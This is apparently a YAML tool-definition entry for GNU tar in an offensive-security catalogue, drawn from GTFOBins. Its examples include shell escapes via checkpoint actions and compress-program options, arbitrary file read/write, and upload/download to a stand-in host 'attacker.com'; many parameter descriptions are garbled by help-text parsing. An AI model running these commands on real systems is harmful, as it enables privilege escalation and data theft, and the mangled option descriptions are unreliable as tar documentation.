---
id: archive-tar-tar
namespace: archive:tar:tar
name: tar
description: GNU tape archiver; can read/write files, transfer data, and spawn shells
  via checkpoint actions Can also download files, read arbitrary files, write to arbitrary
  files, spawn an interactive shell, upload files.
author: GTFOBins
version: 1.0.0
capabilities:
- network.transfer.download
- system.file.read
- system.file.write
- security.privilege-escalation.shell
- network.transfer.upload
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- tar
parameters:

  - name: absolute-names
    type: string
    required: false
    default: null
    description: "don't strip leading '/'s from file names"
    aliases:
      - "-P"
      - "--absolute-names"
  - name: acls
    type: string
    required: false
    default: null
    description: "Enable the POSIX ACLs support"
    aliases:
      - "--acls"
  - name: add-file
    type: file
    required: false
    default: null
    description: "add given FILE to the archive (useful if its name"
    aliases:
      - "--add-file"
  - name: anchored
    type: string
    required: false
    default: null
    description: "patterns match file name start"
    aliases:
      - "--anchored"
  - name: append
    type: string
    required: false
    default: null
    description: "append files to the end of an archive"
    aliases:
      - "-r"
      - "--append"
  - name: atime-preserve
    type: string
    required: false
    default: null
    description: "preserve access times on dumped files, either"
    aliases:
      - "--atime-preserve"
  - name: auto-compress
    type: string
    required: false
    default: null
    description: "use archive suffix to determine the compression"
    aliases:
      - "-a"
      - "--auto-compress"
  - name: backup
    type: string
    required: false
    default: null
    description: "backup before removal, choose version CONTROL"
    aliases:
      - "--backup"
  - name: block-number
    type: string
    required: false
    default: null
    description: "show block number within archive with each message"
    aliases:
      - "-R"
      - "--block-number"
  - name: blocking-factor
    type: string
    required: false
    default: null
    description: "BLOCKS x 512 bytes per record"
    aliases:
      - "-b"
      - "--blocking-factor"
  - name: bzip2
    type: string
    required: false
    default: null
    description: "filter the archive through bzip2"
    aliases:
      - "-j"
      - "--bzip2"
  - name: catenate
    type: string
    required: false
    default: null
    description: "append tar files to an archive"
    aliases:
      - "-A"
      - "--catenate"
      - "--concatenate"
  - name: check-device
    type: string
    required: false
    default: null
    description: "check device numbers when creating incremental"
    aliases:
      - "--check-device"
  - name: check-links
    type: string
    required: false
    default: null
    description: "print a message if not all links are dumped"
    aliases:
      - "-l"
      - "--check-links"
  - name: checkpoint
    type: string
    required: false
    default: null
    description: "(default 10) --checkpoint-action=ACTION execute ACTION on each checkpoint --full-time print file time to its full resolution --index-file=FILE send verbose output to FILE"
    aliases:
      - "--checkpoint"
  - name: checkpoint_action
    type: boolean
    required: false
    description: "execute ACTION on each checkpoint"
    aliases:
      - "--checkpoint-action"
  - name: clamp-mtime
    type: string
    required: false
    default: null
    description: "only set time when the file is more recent than"
    aliases:
      - "--clamp-mtime"
  - name: compress
    type: string
    required: false
    default: null
    description: "filter the archive through compress"
    aliases:
      - "-Z"
      - "--compress"
      - "--uncompress"
  - name: create
    type: string
    required: false
    default: null
    description: "create a new archive"
    aliases:
      - "-c"
      - "--create"
  - name: delay-directory-restore
    type: string
    required: false
    default: null
    description: "delay setting modification times and"
    aliases:
      - "--delay-directory-restore"
  - name: delete
    type: string
    required: false
    default: null
    description: "delete from the archive (not on mag tapes!)"
    aliases:
      - "--delete"
  - name: dereference
    type: string
    required: false
    default: null
    description: "follow symlinks; archive and dump the files they"
    aliases:
      - "-h"
      - "--dereference"
  - name: diff
    type: string
    required: false
    default: null
    description: "find differences between archive and file system"
    aliases:
      - "-d"
      - "--diff"
      - "--compare"
  - name: directory
    type: file
    required: false
    default: null
    description: "change to directory DIR"
    aliases:
      - "-C"
      - "--directory"
  - name: exclude
    type: string
    required: false
    default: null
    description: "exclude files, given as a PATTERN"
    aliases:
      - "--exclude"
  - name: exclude-backups
    type: string
    required: false
    default: null
    description: "exclude backup and lock files"
    aliases:
      - "--exclude-backups"
  - name: exclude-caches
    type: string
    required: false
    default: null
    description: "exclude contents of directories containing"
    aliases:
      - "--exclude-caches"
  - name: exclude-caches-all
    type: string
    required: false
    default: null
    description: "exclude directories containing CACHEDIR.TAG"
    aliases:
      - "--exclude-caches-all"
  - name: exclude-caches-under
    type: file
    required: false
    default: null
    description: "CACHEDIR.TAG --exclude-ignore=FILE read exclude patterns for each directory from FILE, if it exists --exclude-ignore-recursive=FILE read exclude patterns for each directory and its subdirectories from FILE, if it exists --exclude-tag=FILE exclude contents of directories containing FILE, except for FILE itself --exclude-tag-all=FILE exclude directories containing FILE --exclude-tag-under=FILE exclude everything under directories containing FILE --exclude-vcs exclude version control system directories --exclude-vcs-ignores read exclude patterns from the VCS ignore files --no-null disable the effect of the previous --null option --no-recursion avoid descending automatically in directories --no-unquote do not unquote input file or member names --no-verbatim-files-from -T treats file names starting with dash as options (default) --null -T reads null-terminated names; implies --verbatim-files-from --recursion recurse into directories (default)"
    aliases:
      - "--exclude-caches-under"
  - name: exclude-from
    type: file
    required: false
    default: null
    description: "exclude patterns listed in FILE"
    aliases:
      - "-X"
      - "--exclude-from"
  - name: exclude_ignore
    type: boolean
    required: false
    description: "read exclude patterns for each directory from"
    aliases:
      - "--exclude-ignore"
  - name: exclude_ignore_recursive
    type: boolean
    required: false
    description: ""
    aliases:
      - "--exclude-ignore-recursive"
  - name: exclude_tag
    type: boolean
    required: false
    description: "exclude contents of directories containing FILE,"
    aliases:
      - "--exclude-tag"
  - name: exclude_tag_all
    type: boolean
    required: false
    description: "exclude directories containing FILE"
    aliases:
      - "--exclude-tag-all"
  - name: exclude_tag_under
    type: boolean
    required: false
    description: "exclude everything under directories"
    aliases:
      - "--exclude-tag-under"
  - name: exclude_vcs
    type: boolean
    required: false
    description: "exclude version control system directories"
    aliases:
      - "--exclude-vcs"
  - name: exclude_vcs_ignores
    type: boolean
    required: false
    description: "read exclude patterns from the VCS ignore files"
    aliases:
      - "--exclude-vcs-ignores"
  - name: extract
    type: string
    required: false
    default: null
    description: "extract files from an archive"
    aliases:
      - "-x"
      - "--extract"
      - "--get"
  - name: file
    type: string
    required: false
    default: null
    description: "use archive file or device ARCHIVE"
    aliases:
      - "-f"
      - "--file"
  - name: files-from
    type: file
    required: false
    default: null
    description: "get names to extract or create from FILE"
    aliases:
      - "-T"
      - "--files-from"
  - name: flag-o
    type: string
    required: false
    default: null
    description: "when creating, same as --old-archive; when"
    aliases:
      - "-o"
  - name: force-local
    type: string
    required: false
    default: null
    description: "archive file is local even if it has a colon"
    aliases:
      - "--force-local"
  - name: format
    type: string
    required: false
    default: null
    description: "create archive of the given format"
    aliases:
      - "-H"
      - "--format"
  - name: format-2
    type: string
    required: false
    default: null
    description: ""
    aliases:
      - "-f"
      - "-b"
      - "--format"
      - "--quoting-style"
      - "--rmt-command"
  - name: full_time
    type: boolean
    required: false
    description: "print file time to its full resolution"
    aliases:
      - "--full-time"
  - name: group
    type: string
    required: false
    default: null
    description: "force NAME as group for added files"
    aliases:
      - "--group"
  - name: group-map
    type: file
    required: false
    default: null
    description: "use FILE to map file owner GIDs and names"
    aliases:
      - "--group-map"
  - name: gzip
    type: string
    required: false
    default: null
    description: "filter the archive through gzip"
    aliases:
      - "-z"
      - "--gzip"
      - "--gunzip"
      - "--ungzip"
  - name: hard-dereference
    type: string
    required: false
    default: null
    description: "follow hard links; archive and dump the files they"
    aliases:
      - "--hard-dereference"
  - name: help
    type: string
    required: false
    default: null
    description: "give this help list"
    aliases:
      - "-?"
      - "--help"
  - name: hole-detection
    type: string
    required: false
    default: null
    description: "--ignore-failed-read do not exit with nonzero on unreadable files --level=NUMBER dump level for created listed-incremental archive --no-check-device do not check device numbers when creating incremental archives --no-seek archive is not seekable"
    aliases:
      - "--hole-detection"
  - name: ignore-case
    type: string
    required: false
    default: null
    description: "ignore case"
    aliases:
      - "--ignore-case"
  - name: ignore-command-error
    type: string
    required: false
    default: null
    description: "--no-ignore-command-error treat non-zero exit codes of children as error"
    aliases:
      - "--ignore-command-error"
  - name: ignore-zeros
    type: string
    required: false
    default: null
    description: "ignore zeroed blocks in archive (means EOF)"
    aliases:
      - "-i"
      - "--ignore-zeros"
  - name: ignore_failed_read
    type: boolean
    required: false
    description: "do not exit with nonzero on unreadable files"
    aliases:
      - "--ignore-failed-read"
  - name: incremental
    type: string
    required: false
    default: null
    description: "handle old GNU-format incremental backup"
    aliases:
      - "-G"
      - "--incremental"
  - name: index_file
    type: boolean
    required: false
    description: "send verbose output to FILE"
    aliases:
      - "--index-file"
  - name: info-script
    type: string
    required: false
    default: null
    description: "run script at end of each tape (implies -M)"
    aliases:
      - "-F"
      - "--info-script"
      - "--new-volume-script"
  - name: interactive
    type: string
    required: false
    default: null
    description: "ask for confirmation for every action"
    aliases:
      - "-w"
      - "--interactive"
      - "--confirmation"
  - name: keep-directory-symlink
    type: string
    required: false
    default: null
    description: "preserve existing symlinks to directories when"
    aliases:
      - "--keep-directory-symlink"
  - name: keep-newer-files
    type: string
    required: false
    default: null
    description: "don't replace existing files that are newer than"
    aliases:
      - "--keep-newer-files"
  - name: keep-old-files
    type: string
    required: false
    default: null
    description: "don't replace existing files when extracting"
    aliases:
      - "-k"
      - "--keep-old-files"
  - name: label
    type: string
    required: false
    default: null
    description: "create archive with volume name TEXT; at"
    aliases:
      - "-V"
      - "--label"
  - name: list
    type: string
    required: false
    default: null
    description: "list the contents of an archive"
    aliases:
      - "-t"
      - "--list"
  - name: listed-incremental
    type: file
    required: false
    default: null
    description: "handle new GNU-format incremental backup"
    aliases:
      - "-g"
      - "--listed-incremental"
  - name: lzip
    type: string
    required: false
    default: null
    description: "filter the archive through lzip"
    aliases:
      - "--lzip"
  - name: lzma
    type: string
    required: false
    default: null
    description: "filter the archive through xz"
    aliases:
      - "--lzma"
  - name: lzop
    type: string
    required: false
    default: null
    description: "filter the archive through lzop"
    aliases:
      - "--lzop"
  - name: mode
    type: string
    required: false
    default: null
    description: "force (symbolic) mode CHANGES for added files"
    aliases:
      - "--mode"
  - name: mtime
    type: string
    required: false
    default: null
    description: "set mtime for added files from DATE-OR-FILE"
    aliases:
      - "-O"
      - "-F"
      - "--mtime"
  - name: multi-volume
    type: string
    required: false
    default: null
    description: "create/list/extract multi-volume archive"
    aliases:
      - "-M"
      - "--multi-volume"
  - name: newer
    type: string
    required: false
    default: null
    description: "only store files newer than DATE-OR-FILE --one-file-system stay in local file system when creating archive"
    aliases:
      - "-N"
      - "-O"
      - "-F"
      - "-O"
      - "-F"
      - "--newer"
      - "--after-date"
  - name: newer_mtime
    type: boolean
    required: false
    description: "compare date and time when data changed only"
    aliases:
      - "--newer-mtime"
  - name: no-acls
    type: string
    required: false
    default: null
    description: "Disable the POSIX ACLs support"
    aliases:
      - "--no-acls"
  - name: no-anchored
    type: string
    required: false
    default: null
    description: "patterns match after any '/' (default for"
    aliases:
      - "--no-anchored"
  - name: no-auto-compress
    type: string
    required: false
    default: null
    description: "do not use archive suffix to determine the"
    aliases:
      - "--no-auto-compress"
  - name: no-delay-directory-restore
    type: integer
    required: false
    default: null
    description: "cancel the effect of --delay-directory-restore option --no-same-owner extract files as yourself (default for ordinary users) --no-same-permissions apply the user's umask when extracting permissions from the archive (default for ordinary users) --numeric-owner always use numbers for user/group names --owner=NAME force NAME as owner for added files --owner-map=FILE use FILE to map file owner UIDs and names"
    aliases:
      - "--no-delay-directory-restore"
  - name: no-ignore-case
    type: string
    required: false
    default: null
    description: "case sensitive matching (default)"
    aliases:
      - "--no-ignore-case"
  - name: no-overwrite-dir
    type: string
    required: false
    default: null
    description: "preserve metadata of existing directories"
    aliases:
      - "--no-overwrite-dir"
  - name: no-quote-chars
    type: string
    required: false
    default: null
    description: "disable quoting for characters from STRING"
    aliases:
      - "--no-quote-chars"
  - name: no-selinux
    type: string
    required: false
    default: null
    description: "Disable the SELinux context support"
    aliases:
      - "--no-selinux"
  - name: no-wildcards
    type: string
    required: false
    default: null
    description: "verbatim string matching"
    aliases:
      - "--no-wildcards"
  - name: no-wildcards-match-slash
    type: string
    required: false
    default: null
    description: "wildcards do not match '/'"
    aliases:
      - "--no-wildcards-match-slash"
  - name: no-xattrs
    type: string
    required: false
    default: null
    description: "Disable extended attributes support"
    aliases:
      - "--no-xattrs"
  - name: no_check_device
    type: boolean
    required: false
    description: "do not check device numbers when creating"
    aliases:
      - "--no-check-device"
  - name: no_ignore_command_error
    type: boolean
    required: false
    description: "exit codes of children as"
    aliases:
      - "--no-ignore-command-error"
      - "-zero"
  - name: no_null
    type: boolean
    required: false
    description: "option"
    aliases:
      - "--no-null"
      - "--null"
  - name: no_recursion
    type: boolean
    required: false
    description: "avoid descending automatically in directories"
    aliases:
      - "--no-recursion"
  - name: no_same_owner
    type: boolean
    required: false
    description: "extract files as yourself (default for ordinary"
    aliases:
      - "--no-same-owner"
  - name: no_same_permissions
    type: boolean
    required: false
    description: "apply the user's umask when extracting permissions"
    aliases:
      - "--no-same-permissions"
  - name: no_seek
    type: boolean
    required: false
    description: "archive is not seekable"
    aliases:
      - "--no-seek"
  - name: no_unquote
    type: boolean
    required: false
    description: "do not unquote input file or member names"
    aliases:
      - "--no-unquote"
  - name: no_verbatim_files_from
    type: boolean
    required: false
    description: "treats file names starting with dash as"
    aliases:
      - "--no-verbatim-files-from"
      - "-T"
  - name: "null"
    type: boolean
    required: false
    description: "names; implies"
    aliases:
      - "--null"
      - "-T"
      - "-terminated"
  - name: numeric_owner
    type: boolean
    required: false
    description: "always use numbers for user/group names"
    aliases:
      - "--numeric-owner"
  - name: occurrence
    type: array
    required: false
    default: null
    description: "in the archive; this option is valid only in conjunction with one of the subcommands --delete, --diff, --extract or --list and when a list of files is given either on the command line or via the -T option; NUMBER defaults to 1 --sparse-version=MAJOR[.MINOR] set version of the sparse format to use (implies --sparse)"
    aliases:
      - "--occurrence"
  - name: old-archive
    type: string
    required: false
    default: null
    description: "same as --format=v7 --pax-option=keyword[[:]=value][,keyword[[:]=value]]... control pax keywords --posix same as --format=posix"
    aliases:
      - "--old-archive"
      - "--portability"
  - name: one-top-level
    type: file
    required: false
    default: null
    description: "extracted --overwrite overwrite existing files when extracting --overwrite-dir overwrite metadata of existing directories when extracting (default) --recursive-unlink empty hierarchies prior to extracting directory --remove-files remove files after adding them to the archive --skip-old-files don't replace existing files when extracting, silently skip over them"
    aliases:
      - "--one-top-level"
  - name: one_file_system
    type: boolean
    required: false
    description: "stay in local file system when creating archive"
    aliases:
      - "--one-file-system"
  - name: overwrite
    type: boolean
    required: false
    description: "overwrite existing files when extracting"
    aliases:
      - "--overwrite"
  - name: overwrite_dir
    type: boolean
    required: false
    description: "overwrite metadata of existing directories when"
    aliases:
      - "--overwrite-dir"
  - name: owner_map
    type: boolean
    required: false
    description: "use FILE to map file owner UIDs and names"
    aliases:
      - "--owner-map"
  - name: pax_option
    type: boolean
    required: false
    description: ""
    aliases:
      - "--pax-option"
  - name: posix
    type: boolean
    required: false
    description: ""
    aliases:
      - "--posix"
      - "--format"
  - name: preserve-order
    type: string
    required: false
    default: null
    description: "member arguments are listed in the same order as the files in the archive"
    aliases:
      - "-s"
      - "--preserve-order"
      - "--same-order"
  - name: preserve-permissions
    type: file
    required: false
    default: null
    description: "extract information about file permissions (default for superuser) --same-owner try extracting files with the same ownership as exists in the archive (default for superuser) --sort=ORDER directory sorting order: none (default), name or inode"
    aliases:
      - "-p"
      - "--preserve-permissions"
      - "--same-permissions"
  - name: quote-chars
    type: string
    required: false
    default: null
    description: "additionally quote characters from STRING"
    aliases:
      - "--quote-chars"
  - name: quoting-style
    type: string
    required: false
    default: null
    description: "values"
    aliases:
      - "--quoting-style"
  - name: read-full-records
    type: string
    required: false
    default: null
    description: "reblock as we read (for 4.2BSD pipes)"
    aliases:
      - "-B"
      - "--read-full-records"
  - name: record-size
    type: integer
    required: false
    default: null
    description: "NUMBER of bytes per record, multiple of 512"
    aliases:
      - "--record-size"
  - name: recursion
    type: boolean
    required: false
    description: "recurse into directories (default)"
    aliases:
      - "--recursion"
  - name: recursive_unlink
    type: boolean
    required: false
    description: "empty hierarchies prior to extracting directory"
    aliases:
      - "--recursive-unlink"
  - name: remove_files
    type: boolean
    required: false
    description: "remove files after adding them to the archive"
    aliases:
      - "--remove-files"
  - name: restrict
    type: string
    required: false
    default: null
    description: "disable use of some potentially harmful options"
    aliases:
      - "--restrict"
  - name: rmt-command
    type: string
    required: false
    default: null
    description: "--rsh-command=COMMAND use remote COMMAND instead of rsh --volno-file=FILE use/update the volume number in FILE"
    aliases:
      - "--rmt-command"
  - name: rsh-command
    type: string
    required: false
    default: null
    description: ""
    aliases:
      - "--rsh-command"
  - name: same_owner
    type: boolean
    required: false
    description: "try extracting files with the same ownership as"
    aliases:
      - "--same-owner"
  - name: seek
    type: string
    required: false
    default: null
    description: "archive is seekable"
    aliases:
      - "-n"
      - "--seek"
  - name: selinux
    type: string
    required: false
    default: null
    description: "Enable the SELinux context support"
    aliases:
      - "--selinux"
  - name: show-defaults
    type: string
    required: false
    default: null
    description: "show tar defaults"
    aliases:
      - "--show-defaults"
  - name: show-omitted-dirs
    type: file
    required: false
    default: null
    description: "when listing or extracting, list each directory"
    aliases:
      - "--show-omitted-dirs"
  - name: show-snapshot-field-ranges
    type: string
    required: false
    default: null
    description: "show valid ranges for snapshot-file fields --show-transformed-names, --show-stored-names show file or archive names after transformation --totals[=SIGNAL] print total bytes after processing the archive; with an argument - print total bytes when this SIGNAL is delivered; Allowed signals are: SIGHUP, SIGQUIT, SIGINT, SIGUSR1 and SIGUSR2; the names without SIG prefix are also accepted --utc print file modification times in UTC"
    aliases:
      - "--show-snapshot-field-ranges"
  - name: show_transformed_names
    type: boolean
    required: false
    description: ""
    aliases:
      - "--show-transformed-names"
      - "--show-stored-names"
  - name: skip_old_files
    type: boolean
    required: false
    description: "don't replace existing files when extracting,"
    aliases:
      - "--skip-old-files"
  - name: sparse
    type: string
    required: false
    default: null
    description: "handle sparse files efficiently"
    aliases:
      - "-S"
      - "--sparse"
  - name: sparse_version
    type: boolean
    required: false
    description: ""
    aliases:
      - "--sparse-version"
  - name: starting-file
    type: string
    required: false
    default: null
    description: "begin at member MEMBER-NAME when reading the archive --newer-mtime=DATE compare date and time when data changed only"
    aliases:
      - "-K"
      - "-N"
      - "--starting-file"
  - name: strip-components
    type: integer
    required: false
    default: null
    description: "strip NUMBER leading components from file"
    aliases:
      - "--strip-components"
  - name: suffix
    type: string
    required: false
    default: null
    description: "backup before removal, override usual suffix ('~'"
    aliases:
      - "--suffix"
  - name: tape-length
    type: integer
    required: false
    default: null
    description: "change tape after writing NUMBER x 1024 bytes"
    aliases:
      - "-L"
      - "--tape-length"
  - name: test-label
    type: string
    required: false
    default: null
    description: "test the archive volume label and exit"
    aliases:
      - "--test-label"
  - name: to-command
    type: string
    required: false
    default: null
    description: "pipe extracted files to another program"
    aliases:
      - "--to-command"
  - name: to-stdout
    type: string
    required: false
    default: null
    description: "extract files to standard output"
    aliases:
      - "-O"
      - "--to-stdout"
  - name: totals
    type: boolean
    required: false
    description: "print total bytes after processing the archive;"
    aliases:
      - "--totals"
  - name: touch
    type: string
    required: false
    default: null
    description: "don't extract file modified time"
    aliases:
      - "-m"
      - "--touch"
  - name: transform
    type: string
    required: false
    default: null
    description: "use sed replace EXPRESSION to transform file names"
    aliases:
      - "--transform"
      - "--xform"
  - name: unlink-first
    type: string
    required: false
    default: null
    description: "remove each file prior to extracting over it"
    aliases:
      - "-U"
      - "--unlink-first"
  - name: unquote
    type: file
    required: false
    default: null
    description: "unquote input file or member names (default)"
    aliases:
      - "--unquote"
  - name: update
    type: string
    required: false
    default: null
    description: "only append files newer than copy in archive"
    aliases:
      - "-u"
      - "--update"
  - name: usage
    type: string
    required: false
    default: null
    description: "give a short usage message"
    aliases:
      - "--usage"
  - name: use-compress-program
    type: string
    required: false
    default: null
    description: "filter through PROG (must accept -d)"
    aliases:
      - "-I"
      - "--use-compress-program"
  - name: utc
    type: boolean
    required: false
    description: "print file modification times in UTC"
    aliases:
      - "--utc"
  - name: verbatim-files-from
    type: string
    required: false
    default: null
    description: "handling)"
    aliases:
      - "-T"
      - "--verbatim-files-from"
  - name: verbose
    type: string
    required: false
    default: null
    description: "verbosely list files processed"
    aliases:
      - "-v"
      - "--verbose"
  - name: verify
    type: string
    required: false
    default: null
    description: "attempt to verify the archive after writing it"
    aliases:
      - "-W"
      - "--verify"
  - name: version
    type: string
    required: false
    default: null
    description: "print program version"
    aliases:
      - "--version"
  - name: volno_file
    type: boolean
    required: false
    description: "use/update the volume number in FILE"
    aliases:
      - "--volno-file"
  - name: warning
    type: string
    required: false
    default: null
    description: "warning control"
    aliases:
      - "--warning"
  - name: wildcards
    type: string
    required: false
    default: null
    description: "use wildcards (default for exclusion)"
    aliases:
      - "--wildcards"
  - name: wildcards-match-slash
    type: string
    required: false
    default: null
    description: "wildcards match '/' (default for exclusion)"
    aliases:
      - "--wildcards-match-slash"
  - name: xattrs
    type: string
    required: false
    default: null
    description: "Enable extended attributes support"
    aliases:
      - "--xattrs"
  - name: xattrs-exclude
    type: string
    required: false
    default: null
    description: "--xattrs-include=MASK specify the include pattern for xattr keys"
    aliases:
      - "--xattrs-exclude"
  - name: xattrs_include
    type: boolean
    required: false
    description: "specify the include pattern for xattr keys"
    aliases:
      - "--xattrs-include"
  - name: xz
    type: string
    required: false
    default: null
    description: "filter the archive through xz"
    aliases:
      - "-J"
      - "--xz"
  - name: zstd
    type: string
    required: false
    default: null
    description: "filter the archive through zstd"
    aliases:
      - "--zstd"

features:
- compression
- file-system
- interactive
- local
- network-intensive
- process-manip
- requires-root
execution:
  template: tar
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Download files
  command: tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh
- description: Read arbitrary files
  command: tar cf /dev/stdout /path/to/input-file -I 'tar xO'
- description: Write to arbitrary files
  command: 'echo DATA >/path/to/temp-file

    tar cf /path/to/temp-file.tar /path/to/temp-file

    tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@'
- description: Spawn an interactive shell
  command: tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
- description: Spawn an interactive shell
  command: tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
- description: Spawn an interactive shell
  command: 'echo ''/bin/sh 0<&1'' >/path/to/temp-file

    tar cf /path/to/temp-file.tar /path/to/temp-file

    tar xf /path/to/temp-file.tar --to-command /bin/sh'
- description: Upload files
  command: tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/tar/
techniques:
- collection
- exfiltration
- privilege-escalation
- execution
install:
- method: apt
  package_name: tar
  commands:
  - apt-get install -y tar
mitre_ids:
- T1560
---

# tar

tar is a command-line utility. GNU tape archiver; can read/write files, transfer data, and spawn shells via checkpoint actions Can also download files, read arbitrary files, write to arbitrary files, spawn an interactive shell, upload files.
